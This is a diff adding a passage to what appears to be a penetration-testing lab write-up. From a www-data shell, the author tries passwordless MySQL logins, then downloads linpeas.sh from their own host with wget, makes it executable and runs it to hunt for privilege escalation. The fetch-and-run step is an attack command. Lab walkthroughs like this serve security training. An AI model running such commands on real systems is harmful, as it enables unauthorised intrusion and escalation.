@@ -1097,3 +1097,49 @@ $
 
 I noticed that there is a MySQL database running internally on port 3306 and a MySQL user as well on the /etc/passwd 
 
+```
+$ mysql -u root -h localhost
+ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
+$ mysql -u www-data -h localhost
+ERROR 1045 (28000): Access denied for user 'www-data'@'localhost' (using password: NO)
+$ 
+
+```
+
+However, I was not able to login to the MySQL database using neither users as I did not have any credentials for this service
+
+Moving forward I decided to launch linpeas for finding privilege escalation vectors 
+
+```
+$ wget http://IP:8000/linpeas.sh 
+--2025-02-14 16:19:10--  http://192.168.45.174:8000/linpeas.sh
+Connecting to 192.168.45.174:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 839912 (820K) [text/x-sh]
+Saving to: `linpeas.sh'
+
+     0K .......... .......... .......... .......... ..........  6% 1.04M 1s
+    50K .......... .......... .......... .......... .......... 12% 1.06M 1s
+   100K .......... .......... .......... .......... .......... 18% 1.06M 1s
+   150K .......... .......... .......... .......... .......... 24% 1.06M 1s
+   200K .......... .......... .......... .......... .......... 30% 1.06M 1s
+   250K .......... .......... .......... .......... .......... 36% 1.07M 0s
+   300K .......... .......... .......... .......... .......... 42% 1.06M 0s
+   350K .......... .......... .......... .......... .......... 48% 1.05M 0s
+   400K .......... .......... .......... .......... .......... 54% 1.10M 0s
+   450K .......... .......... .......... .......... .......... 60% 1.06M 0s
+   500K .......... .......... .......... .......... .......... 67% 1.06M 0s
+   550K .......... .......... .......... .......... .......... 73% 1.06M 0s
+   600K .......... .......... .......... .......... .......... 79% 1.06M 0s
+   650K .......... .......... .......... .......... .......... 85% 1.06M 0s
+   700K .......... .......... .......... .......... .......... 91% 1.07M 0s
+   750K .......... .......... .......... .......... .......... 97% 1.06M 0s
+   800K .......... ..........                                 100% 1.10M=0.8s
+
+2025-02-14 16:19:10 (1.06 MB/s) - `linpeas.sh' saved [839912/839912]
+
+$ chmod +x linpeas.sh
+$ ./linpeas.sh
+
+```
+
